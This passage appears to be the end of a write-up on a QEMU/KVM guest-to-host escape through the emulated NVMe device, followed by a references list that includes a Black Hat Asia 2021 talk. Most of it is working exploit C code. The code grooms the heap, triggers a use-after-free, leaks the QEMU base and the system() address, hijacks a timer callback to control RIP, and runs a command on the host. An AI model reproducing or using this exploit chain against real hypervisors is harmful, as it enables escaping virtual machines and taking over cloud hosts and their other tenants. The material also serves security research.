    for(int i = 20; i < 25; i++)
        cmd[inc_tail()] = create_sq(gva_to_gpa(cmds[i]), i, 3, i);
    nvme_wr32(0x1000, admin_tail);
    printf("[D] NVME CLEAR FREELIST OK!\n");
    // getchar();

    /*         construct second unintialized chunk */
    heap_layout3();
    //printf("[D] VIRTIO GPU HEAP LAYOUT OK! 0x150 TABLE -> USERSPACE 0x40 CHUNK\n");
    // getchar();

    /*           free chunk 0x150->0x40 , use sqid = 2   */
    cmd[inc_tail()] = create_sq(gva_to_gpa(cmds[2]), 2, 1, 2);
	nvme_wr32(0x1000, admin_tail);
    vuln(2);
    //printf("[D] NVME FREE 0x40 CHUNK OK!\n");
    // getchar();

    /*           new timer , use sqid = 3           */
    cmd[inc_tail()] = create_sq(gva_to_gpa(cmds[3]), 3, 1, 3);
	nvme_wr32(0x1000, admin_tail);
    //printf("[D] NVME NEW TIMER OK!\n");
    // getchar();


    /*          leak qemu_base & heap_base          */
    leak = (uint64_t *)ent;
    uint64_t qemu_base = leak[2] - nvme_process_sq_offset;
    uint64_t system = qemu_base + system_offset;
    // getchar();
     printf(" _ _       _     _                             _       _\n\
 | (_) __ _| |__ | |_   _   _  ___  __ _ _ __  | | __ _| |__\n\
 | | |/ _` | '_ \\| __| | | | |/ _ \\/ _` | '__| | |/ _` | '_ \\\n\
 | | | (_| | | | | |_  | |_| |  __/ (_| | |    | | (_| | |_) |\n\
 |_|_|\\__, |_| |_|\\__|  \\__, |\\___|\\__,_|_|    |_|\\__,_|_.__/\n\
      |___/             |___/\n\n");

    printf("[D] Qemu base = 0x%lx\n", qemu_base);
    printf("[D] System addr = 0x%lx\n", system);

    // getchar();

    /*          control RIP                         */
    leak[3] = physmap_addr;
    leak[2] = qemu_base + cleanup_offset;


    printf("[D] Control RIP Sucessful! \n");

    // fflush(stdout);
    sleep(1);
    /*           trigger system command             */
    nvme_wr32(0x1000 + 8*3, 1);
}
```

# References

[【Black Hat Asia 2021 系列分享】清道夫：误用“错误处理代码”导致的 QEMU/KVM 逃逸](https://mp.weixin.qq.com/s/1KYTZynabBqzNjoJhe1bWw)
[manishrma/nvme-qemu: A detailed guide for setting up NVMeOF in qemu, debugging using gdb and tracing packets via wireshark](https://github.com/manishrma/nvme-qemu)
[解决 Linux 内核问题实用技巧之 - Crash 工具结合/dev/mem 任意修改内存](https://mp.weixin.qq.com/s/040W19-CPF0VnUvwFSKiXw)
[解决 Linux 内核问题实用技巧之-dev/mem 的新玩法](https://mp.weixin.qq.com/s/fdLEGv2osE3AnxhQ7Lkr3w)
[Directly Access Your Physical Memory (dev/mem) - Heejin Park](https://bakhi.github.io/devmem/)
[LINUX 内核中计算页面号\_chenglinhust 的专栏-CSDN 博客](https://blog.csdn.net/chdhust/article/details/8889368)
[Five Lines of Code: How to translate virtual to physical addresses through /proc/pid/pagemap](http://fivelinesofcode.blogspot.com/2014/03/how-to-translate-virtual-to-physical.html)
[How to setup NVMe/TCP with NVME-oF using KVM and QEMU - ARM-Datacenter](https://futurewei-cloud.github.io/ARM-Datacenter/qemu/nvme-of-tcp-vms/)
[NVMe device in QEMU-VM](http://blog.frankenmichl.de/2018/02/13/add-nvme-device-to-vm/)
[阿呆实战 NVMe 之六](http://www.ssdfans.com/?p=8169)
[Using QEMU to create a Ubuntu 20.04 Desktop VM on macOS](https://www.arthurkoziel.com/qemu-ubuntu-20-04/)
[Why does /proc/iomem only show zeros instead addresses in 64bit linux? - Stack Overflow](https://stackoverflow.com/questions/50045996/why-does-proc-iomem-only-show-zeros-instead-addresses-in-64bit-linux)
[linux 里的 nvme 驱动代码分析（加载初始化）\_潘振杰的工作室-CSDN 博客](https://blog.csdn.net/panzhenjie/article/details/51581063)
[NVMe 解读 - 知乎](https://zhuanlan.zhihu.com/p/347599423)
[Non-Volatile Memory Host Controller Interface](https://www.nvmexpress.org/wp-content/uploads/NVM-Express-1_1.pdf)
